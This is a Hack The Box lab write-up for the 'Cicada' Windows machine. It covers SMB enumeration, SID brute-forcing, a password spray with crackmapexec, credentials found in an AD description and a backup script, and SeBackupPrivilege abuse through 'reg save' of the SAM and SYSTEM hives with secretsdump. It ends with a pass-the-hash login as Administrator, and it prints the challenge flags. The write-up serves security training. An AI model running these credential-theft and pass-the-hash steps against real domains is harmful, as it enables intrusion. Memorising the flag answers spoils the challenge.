---
title: 'Cicada'
date: '2026-09-18'
excerpt: 'Easy - Windows (AD Exploitation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Cicada</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the SeBackupPrivilege to achieve full system compromise.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the name of the non-default SMB share that is readable with guest access on Cicada?</p>
<p class="mb-3">We start off with running <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.231.149 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-17 23:10 EDT
Nmap scan report for 10.129.231.149
Host is up (0.44s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 10:14:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-09-17T10:15:57+00:00; -16h56m03s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-17T10:15:58+00:00; -16h56m03s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-09-17T10:15:57+00:00; -16h56m03s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-09-17T10:15:58+00:00; -16h56m03s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-17T10:15:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -16h56m03s, deviation: 0s, median: -16h56m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.03 seconds
```

<p class="mb-3">We can see many open ports. We need to add the DNS entry in <code>/etc/hosts</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ echo "10.129.231.149 cicada.htb" | sudo tee -a /etc/hosts
10.129.231.149 cicada.htb
```

<p class="mb-3">Now we list out the target SMB shares as an anonymous user.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ smbclient -L //10.129.231.149
Password for [WORKGROUP\aaronamran]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

<p class="mb-3">We attempt to view the contents of both the <code>DEV</code> and <code>HR</code> shares.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ smbclient //10.129.231.149/DEV
Password for [WORKGROUP\aaronamran]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ smbclient //10.129.231.149/HR
Password for [WORKGROUP\aaronamran]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 482141 blocks available
smb: \> get Notice from HR.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> get 'Notice from HR.txt'
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \'Notice
smb: \> get Notice\ from\ HR.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice\
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> exit
```

<p class="mb-5"><strong>Answer:</strong> HR</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the name of the file found in the HR share?</p>
<p class="mb-3">Reading the downloaded text file reveals the company's default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

<p class="mb-5"><strong>Answer:</strong> Notice from HR.txt</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> Which user account is still using the company default password?</p>
<p class="mb-3">We try checking to see if any accounts are still using the default password. To do this, we must find all the users that are in the domain, and we can do this using Impacket's <code>lookupsid</code> module. This tool will try brute forcing the Windows Security Identifiers (SIDs) of any users in the AD domain. Each user has a unique SID, which is comprised of their relative identifier (RID) concatenated with the domain SID. User SIDs are typically issued by a Domain Controller and are used in authorisation and access mechanisms such as to form a part of the access token created during sign-in. To enumerate the domain, we specify the <code>guest</code> user, the domain name and <code>-no-pass</code> for no password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

<p class="mb-3">In the results, we find groups, users, and aliases within the domain. This helps us to understand its overall structure. Since we want a list of users, we compile all the items that fall under the <code>SidTypeUser</code> category. To avoid doing this manually, we will rerun the command with some additional arguments: we use <code>grep</code> to specify taking only the users and <code>sed</code> to remove any text other than the name. Then, we will pass the items into a file called <code>users.txt</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ ls
 cacert.der   Desktop   Documents   Downloads   Music   my_data  'Notice from HR.txt'   Pictures   Templates   users.txt   Videos
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ cat users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

<p class="mb-3">We use crackmapexec to execute our password spray attack. We will specify the file containing the users found and the default password. Crackmapexec will try the password on each user.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

<p class="mb-3">The output reveals that the user <code>michael.wrightson</code> is still using the default password.</p>
<p class="mb-5"><strong>Answer:</strong> michael.wrightson</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> Which user has left their password in Active Directory metadata?</p>
<p class="mb-3">We now check if Michael can access new data.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share 
```

<p class="mb-3">Analysing the output, we notice that Michael has no access to the <code>DEV</code> share, and the other shares are dead ends, we need to pivot downwards into Active Directory data. We use Michael's valid domain session to query the Domain Controller for information about other users, hoping to find a path to a more privileged account.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account 
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

<p class="mb-3">The user <code>david.orelious</code> has saved his password <code>aRt$Lp#7t*VQ!3</code> under his AD description in case he forgets it. This should help us in privesc later.</p>
<p class="mb-5"><strong>Answer:</strong> david.orelious</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the name of the PowerShell script located in the DEV share?</p>
<p class="mb-3">Since we have David's credentials, we check what shares he has access to.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```

<p class="mb-3">It seems we have access to the <code>DEV</code> share. Logging in as David to check the files inside, we see a <code>Backup_script.ps1</code> which we download.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

		4168447 blocks of size 4096. 478250 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
```

<p class="mb-5"><strong>Answer:</strong> Backup_script.ps1</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the emily.oscars user's password?</p>
<p class="mb-3">The script contents are shown below:</p>

```PowerShell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

<p class="mb-5"><strong>Answer:</strong> Q!3@Lp#M6b*7t*Vt</p>
<br />



<p class="mb-2"><strong>Question 7:</strong> Submit the flag located in the emily.oscars user's home directory.</p>
<p class="mb-3">We now have the new credentials <code>emily.oscars</code>:<code>Q!3@Lp#M6b*7t*Vt</code> which we use to get a shell on the machine by utilising Evil-WinRM. Once we successfully gain access, we read the user flag.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/17/2026   3:13 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> more user.txt
cb05c72870d5994a59be25e9daeed552
```

<p class="mb-5"><strong>Answer:</strong> cb05c72870d5994a59be25e9daeed552</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What dangerous privilege does the emily.oscar user have associated with their account?</p>
<p class="mb-3">Running <code>whoami /priv</code> reveals that Emily has the <code>SeBackupPrivilege</code>, which is typically given to service accounts or administrative users. This privilege is designed to facilitate system backups, which also enables access to system-protected files while bypassing other existing permissions. In a real-world scenario, a user account should not be granted this privilege as they effectively have access to sensitive files such as <code>SYSTEM</code> and <code>SAM</code> Windows Registry Hives.</p>

```console
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

<p class="mb-5"><strong>Answer:</strong> SeBackupPrivilege</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What is the Administrator user's NTLM hash?</p>
<p class="mb-3">Previously we knew that Emily has the <code>SeBackupPrivilege</code>, and that she also has access to <code>SYSTEM</code> and <code>SAM</code> Windows Registry Hives. The <code>SAM</code> (Security Account Manager) hive contains local user account and group membership information, including their hashed passwords. The <code>SYSTEM</code> hive contains system-wide configuration settings, such as the system boot key required to decrypt the password hashes stored in <code>SAM</code>. We need to dump these hives to dump the user NTLM hashes. Then we can use the Administrator hash to authenticate instead of a plaintext password. We use the <code>reg save</code> command to perform a command in the registry, specify the location of the hive, and save it to a file in the current directory with the appropriate name.</p>

```console
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.
```

<p class="mb-3">We download the two files to our system.</p>

```console
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
                                        
Info: Download successful!
```

<p class="mb-3">Now we can use Impacket's <code>secretsdump</code> module to dump the user NTLM hashes. The NTLM hash represents a cryptographic version of a user's plaintext password. Once retrieved, we could try to crack the hash or use it in a Pass-the-Hash attack to authenticate directly to the system without needing a plaintext password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ impacket-secretsdump -sam sam -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

<p class="mb-3">In the output, we can see the Administrator NTLM hash <code>2b87e7c93a3e8a0ea4a581937016f341</code>.</p>
<p class="mb-5"><strong>Answer:</strong> 2b87e7c93a3e8a0ea4a581937016f341</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> Submit the flag located on the Administrator user's Desktop.</p>
<p class="mb-3">We can use the Administrator NTLM hash directly to login to the account with Evil-WinRM by passing the NTLM hash as a parameter with <code>-H</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-1vos8kw8ef-htb-cloud-com]─[~]
└──╼ [★]$ evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/17/2026   3:13 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
0df20897c654d3857b42bafc223a6681
```

<p class="mb-5"><strong>Answer:</strong> 0df20897c654d3857b42bafc223a6681</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>